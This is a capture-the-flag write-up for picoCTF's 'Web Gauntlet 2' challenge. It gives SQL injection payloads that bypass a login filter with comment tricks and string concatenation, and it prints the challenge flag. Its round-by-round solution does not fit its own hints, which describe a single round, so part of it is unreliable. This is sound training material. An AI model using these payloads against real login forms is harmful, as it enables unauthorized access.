# Web Gauntlet 2 ❓
Tags: Web Exploitation<br>
Point: 200<br>
AUTHOR: MADSTACKS<br>
Description:<br>
This website looks familiar... <br>
Log in as admin Site: http://mercury.picoctf.net:26215/ <br>
Filter: http://mercury.picoctf.net:26215/filter.php<br>

Hints:
- I tried to make it a little bit less contrived since the mini competition.
- Each filter is separated by a space. Spaces are not filtered.
- There is only 1 round this time, when you beat it the flag will be in filter.php.
- There is a length component now.
- sqlite


## Write-up: 📝
We have to get through all 5 SQLi challenges. One link gives the form , display query after wrong credential submission or nothing if the query statement contains filtered words.
The other links show the filtered words.
## Solution: 💯
### Round 1:

Filter: `or`

Login as admin so the username=admin, and query **sqli** here. Use `--` to comment out

User: `admin' --`

Pass: `123456` (arbitary string)

Our query: `SELECT * FROM users WHERE username='admin' --'  AND password='123'`

### Round 2:

Filter: `or and like = --`

Login as admin. Change comment out operator "--" to "/*"

User: `admin' /*`

Password: `123456` (arbitary string)

Our query: `SELECT * FROM users WHERE username='admin' /*'  AND password='123'`

### Round 3:

Filter: `or and = like > < --`

Beware of this round also filter **spaces** so we use the payload above and replace **spaces** with `/**/`

User: `admin'/**//*`

Password: `123456` (arbitary string)

Our query: `SELECT * FROM users WHERE username='admin'/**//*'  AND password='123'`

### Round 4:

Filter: `or and = like > < -- admin`

They filter the string **"admin"** if we input directly. So we need a **concatenation operator** and here we use `||`

User: `ad'||'min'/**//*`

Pass: `123456` (arbitary string)

Our query: `SELECT * FROM users WHERE username='ad'||'min'/**//*'  AND password='123'`

### Round 5:

Filter: `or and = like > < -- union admin`

With **union** filtered, our payload above is not affected.

User: ad'||'min'/**//*

Pass: `123456` (arbitary string)

Our query: `SELECT * FROM users WHERE username='ad'||'min'/**//*'  AND password='123'`

When you done reaching to 6/5 round. Back to **filter** file and the flag is there !

#### The Flag (for reference): ✔️
```
picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}
```

